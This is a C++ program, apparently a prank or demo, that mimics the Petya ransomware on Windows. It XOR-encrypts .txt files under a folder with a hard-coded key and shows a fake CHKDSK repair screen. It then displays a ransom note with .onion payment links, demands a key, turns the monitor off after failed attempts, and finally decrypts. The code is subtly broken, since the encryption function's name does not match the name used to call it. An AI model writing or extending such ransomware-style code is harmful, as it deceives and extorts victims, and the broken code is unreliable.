/*     
    PETYA UPDATE
    V. 2.0
    IT CANS: 
        1. ENCRYPT OR DECRYPT FILES
        2. TURNS OFF OR ON YOUR MONITOR
    THIS PROGRAMM IS ONLY FOR WINDOWS!
*/

//HOW THIS CAN ENCRYPT? IN THE FOLDER WITH THE PROGRAM, CREATE A FOLDER "hey" AND THEN CREATE MORE FILES OF THE ".txt" FORMAT, FILLING THEM WITH SOME DATA.
//PASSWORD DECRYPT: Petya23

#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <vector>
#include <algorithm>
#include <windows.h>
#include <conio.h>

using namespace std;
using namespace std::filesystem;

const int DISK_SIZE = 350931;
const string ultimateKey = "Petya23";

string XOREncryptDecrypt(const string& input, const string& originalKey) {
    string output = input;
    hash<string> hash_fn;
    size_t seed = hash_fn(originalKey);
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ static_cast<unsigned char>(seed & 0xFF);
        // Update seed for next byte
        seed = hash_fn(to_string(seed));
    }
    return output;
}
void processFilesInDirectory(const string& directory, const string& password) {
    for (const auto& entry : recursive_directory_iterator(directory)) {
        if (entry.path().extension() == ".txt") {
            const string filePath = entry.path().string();
            ifstream inputFile(filePath, ios::binary);
            if (!inputFile) {
                cerr << "Failed to open input file: " << filePath << "\n";
                continue;
            }

            string data((istreambuf_iterator<char>(inputFile)), istreambuf_iterator<char>());
            inputFile.close();

            string processedData = xorEncryptDecrypt(data, password);

            ofstream outputFile(filePath, ios::binary | ios::trunc);
            if (!outputFile) {
                cerr << "Failed to open output file: " << filePath << "\n";
                continue;
            }

            outputFile.write(processedData.c_str(), processedData.size());
            outputFile.close();
        }
    }
}

void StartMessage()
{
    int sectorPercent = 0;
    processFilesInDirectory("hey", ultimateKey);
    cout << "Repairing file system on C: \n" << endl;
    cout << "The type of the file system is NTFS.\n" << endl;
    cout << "One of your disks contains errors and needs to be repaired. This process" << endl;
    cout << "may take several hours to complete. It is strongly recommended to let it\ncomplete\n";

    cout << "\nWARNING: DO NOT TURN OFF YOUR PC! IF YOU ABORT THIS PROCESS. YOU COULD" << endl;
    cout << "DESTROY ALL OF YOUR DATA! PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\nIN!\n" << endl;
    

    for (int sector = 0; sector <= DISK_SIZE; sector++)
    {
        sectorPercent = (sector * 100) / DISK_SIZE;
        string newLine = "\rCHKDSK is repairing sector " + to_string(sector) + " of " + to_string(DISK_SIZE) + " (" + to_string(sectorPercent) + "%)";
        cout << newLine;
    }
}
void SkullScreen()
{
    cout << endl << endl;
    cout << "                        uu$$$$$$$$$$$uu" << endl;
    cout << "                     uu$$$$$$$$$$$$$$$$$uu" << endl;
    cout << "                    u$$$$$$$$$$$$$$$$$$$$$u" << endl;
    cout << "                    u$$$$$$$$$$$$$$$$$$$$$$$u" << endl;
    cout << "                  u$$$$$$$$$$$$$$$$$$$$$$$$$u" << endl;
    cout << "                  u$$$$$$$$$$$$$$$$$$$$$$$$$u" << endl;
    cout << "                 u$$$$$$*    *$$$**   $$$$$$u" << endl;
    cout << "                  *$$$$*      u$u       $$$$*" << endl;
    cout << "                   $$$u       u$u       u$$$" << endl;
    cout << "                   $$$u      u$$$u      u$$$" << endl;
    cout << "                    *$$$$uu$$$   $$$uu$$$$*" << endl;
    cout << "                     *$$$$$$$*   *$$$$$$$*" << endl;
    cout << "                       u$$$$$$$u$$$$$$$u" << endl;
    cout << "                        u$*$*$*$*$*$*$u" << endl;
    cout << "           uuu          $$u$ $ $ $ $u$$      uuu" << endl;
    cout << "          u$$$$          $$$$u$u$u$u$$      u$$$$" << endl;
    cout << "           $$$$$uu        *$$$$$$$$$*    uu$$$$$$" << endl;
    cout << "          u$$$$$$$$$$$       *****   uuuu$$$$$$$$$" << endl;
    cout << "           $$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*" << endl;
    cout << "           ***       **$$$$$$$$$$$uu **$***" << endl;
    cout << "                    uuuu  **$$$$$$$$$$uuu" << endl;
    cout << "            u$$$uuu$$$$$$$$$uu  **$$$$$$$$$$$uuu$$$" << endl;
    cout << "            $$$$$$$$$$****            **$$$$$$$$$$$*" << endl;
    cout << "             *$$$$$*                        **$$$$**" << endl;
    cout << "               $$$*      PRESS ANY KEY!       $$$$*" << endl;
}
void SkullScreenFlicker() {

    bool keyPressed = false;
    system("cls");

    SkullScreen();

    while (!keyPressed) {
        system("color 4F");
        Sleep(90);

        system("color F4");
        Sleep(90);

        if (_kbhit()) {
            keyPressed = true;
            _getch();
            system("color 0F");
        }
    }
}
void EncryptedMessage()
{

    string inputKey;
    int attempts = 0;
    int attemptsLimit = 5;
    system("cls");
    system("color 4F");

    cout << "You became victim of the PETYA RANSOMWARE!\n\n" << endl;
    cout << "The harddisks of your computer have been encrypted with an military grade" << endl;;
    cout << "encryption algorithm.There is no way to restore your data without a special " << endl;
    cout << "key.You can purchase this key on the darknet page shown in step 2.\n" << endl;
    cout << "To purchase your key and restore your data, please follow these three easy steps: \n" << endl;
    cout << "1. Download the Tor Browser at <<https://www.torproject.org/>>. If you need" << endl;
    cout << "help, please google for <<access onion page>>\n" << endl;
    cout << "2. Visit one of the following pages with the Tor Browser : \n" << endl;
    cout << "http://petya37h5tbhyvki.onion/QPRmMR" << endl;
    cout << "http://petya5koahtsf7sv.onion/QPRmMR\n" << endl;
    cout << "3. Enter your personal decryption code there :\n" << endl;
    cout << "4bPQb6 - PrwjRN - Cex4C8 - Bz5yE7 - 7aii8S - NdHFDx - s1q2Q2 - S6eqT6 - k5G8z1\n - gHixmE - pYtTPd - 1RHJq4 - 5UpVjr - SLizps - 5Kq46t";
    cout << "\nIf you already purchased your key, please enter it below." << endl;
    cout << "\n\nWARNING! YOU HAVE ONLY 5 ATTEMPTS. IF YOUR ATTEMPTS WILL BE OUT, YOUR MONITOR TURNS OFF.";
    cout << " \nKey : ";
    while (attempts < attemptsLimit && cin >> inputKey) {
        if (inputKey == ultimateKey) {
            break;
        }
        else {
            attempts++;
            cout << "Incorrect key! You have " << (attemptsLimit - attempts) << " attempts." << endl;
        }
        if (attempts < attemptsLimit) {
            cout << "Key: ";
        }
    }
    if (attempts == attemptsLimit) {
        cout << "YOU HAVE NO ATTEMPTS. YOUR MONITOR WILL BE ON IN 10 SECONDS!" << endl;
        system("pause");
        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
        Sleep(10000);
        SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
    }
}
void DescryptingSystem()
{
    int sectorPercent = 0;
    processFilesInDirectory("hey", ultimateKey);
    for (int sector = 0; sector <= DISK_SIZE; sector++)
    {
        sectorPercent = (sector * 100) / DISK_SIZE;
        string newLine = "\rDescrypting Sector " + to_string(sector) + " of " + to_string(DISK_SIZE) + " (" + to_string(sectorPercent) + "%)";
        cout << newLine;
    }
}
void EndScreen() {

    bool keyPressed = false;

    system("cls");
    system("color 8F");

    while (!keyPressed) {
        system("cls");
        cout << "Please reboot your computer!\n";
        cout << "(To end you can press any key)\n";
        Sleep(100);
        system("cls");
        Sleep(100);

        if (_kbhit()) {
            return;
        }
    }
    return;
}

int main()
{
    StartMessage();
    SkullScreenFlicker();
    EncryptedMessage();
    DescryptingSystem();
    EndScreen();
    return 0;
}
